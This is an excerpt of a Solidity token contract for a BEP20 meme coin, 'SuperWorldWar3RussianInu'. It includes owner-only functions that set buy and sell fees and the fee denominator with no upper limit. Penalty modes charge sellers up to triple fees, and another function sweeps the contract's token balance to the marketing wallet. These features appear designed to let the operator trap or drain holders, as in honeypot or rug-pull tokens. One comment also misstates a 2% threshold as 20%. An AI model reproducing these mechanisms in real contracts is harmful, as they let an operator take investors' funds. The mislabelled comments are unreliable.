...
/* Token contract */
contract SuperWorldWar3RussianInu is IBEP20, Auth {
    using SafeMath for uint256;

    // Addresses
    address BTC = 0x2859e4544C4bB03966803b044A93563Bd2D0DD4D; 
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEV = 0x2C0a04C027329d8502b8CB408083b7E0CF0b46b2;
    ...
    // Name and symbol
    string constant _name = "SuperWorldWar3RussianInu";
    string constant _symbol = "SWW3RI";
    ...
    // Max wallet and TX
    uint256 public _maxTxAmount = _totalSupply * 100 / 10000; // 1% on launch or 1M tokens
    uint256 _maxBuyTxAmount = _totalSupply * 100 / 10000; // 1% on launch or 1M tokens
    uint256 _maxSellTxAmount = _totalSupply * 100 / 10000; // 1% on launch or 1M tokens
    uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000; // 2% on launch or 2m tokens
    ...
    uint256 public swapThreshold = (_totalSupply * 200) / 10000; // 20% of supply
    ...
    constructor () Auth(msg.sender) {
        ...
        autoLiquidityReceiver = 0xC974eea294631c30A491d08059583c277146F65f;
        marketingFeeReceiver = 0xC974eea294631c30A491d08059583c277146F65f;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, amount, isSell, AJModeX) : amount;
    ...
    // Jeetimus Prime Mode Importante (Samzino Function MOTHERFUCKERS)
    function takeFee(address sender, uint256 amount, bool isSell, uint256 AJMode) internal returns (uint256) {
        uint256 feeAmount;
        uint256 heldTokens = balanceOf(sender);

        if ((AJMode == 1) && (amount >= (_maxSellTxAmount).div(6).mul(5))) {
            if(isSell) {
                feeAmount = amount.mul(totalFee).mul(3).div(2).div(feeDenominator); // 1.5x 
            } else {
                feeAmount = amount.mul(totalFee).div(feeDenominator);
            }
        } else if ((AJMode == 2) && (amount >= (heldTokens).div(4).mul(2))) { // 1/2 Bag Restriction
            if(isSell) {
                feeAmount = amount.mul(totalFee).mul(3).div(1).div(feeDenominator); // 3.0x 
            } else {
                feeAmount = amount.mul(totalFee).div(feeDenominator);
            } 
        } else if ((AJMode == 3) && (amount >= (heldTokens).div(8).mul(2))) { // 1/4 Bag Restriction
            if(isSell) {
                feeAmount = amount.mul(totalFee).mul(3).div(1).div(feeDenominator); // 3.0x 
            } else {
                feeAmount = amount.mul(totalFee).div(feeDenominator);
    ...
    // Enable Jeetimus Avenger Prime Mode (Samzino Function MOTHERFUCKERS)
    function enable_Jeetimus_Prime(uint256 _Mode) public authorized { 
        AJModeX = _Mode;
    }

    // Enable BT Protection (Samzino Function MOTHERFUCKERS)
    function enable_BT_Protection(bool _Mode) public authorized {
        BTProtection = _Mode;
    }
    ...
    // Set Buy And Sell Fees In One Function
    function setAllFees(bool _IsSellFee, uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _devFee, uint256 _feeDenominator) external authorized {
    if (_IsSellFee == true) {
        ...
        devFeeSell = _devFee;
        totalFeeSell = _liquidityFee.add(_buybackFee).add(_reflectionFee).add(_marketingFee).add(_devFee);
        feeDenominator = _feeDenominator;
    } else if (_IsSellFee == false) {
        liquidityFeeBuy = _liquidityFee;
        buybackFeeBuy = _buybackFee;
        reflectionFeeBuy = _reflectionFee;
        marketingFeeBuy = _marketingFee;
        devFeeBuy = _devFee;
        totalFeeBuy = _liquidityFee.add(_buybackFee).add(_reflectionFee).add(_marketingFee).add(_devFee);
        feeDenominator = _feeDenominator;
    } 
    }
    ...
    // Set The Deadblocks Settings (Samzino Function MOTHERFUCKERS)
    function setDeadBlocksSettings(uint256 _deadBlocks) external authorized {
    ...
    function ReiteratorBalance(IBEP20 _token) external authorized {
        require(msg.sender == owner, "Only owner can withdraw funds");
        uint256 bep20balance = _token.balanceOf(address(this));
        _token.transfer(marketingFeeReceiver, bep20balance);
    }    
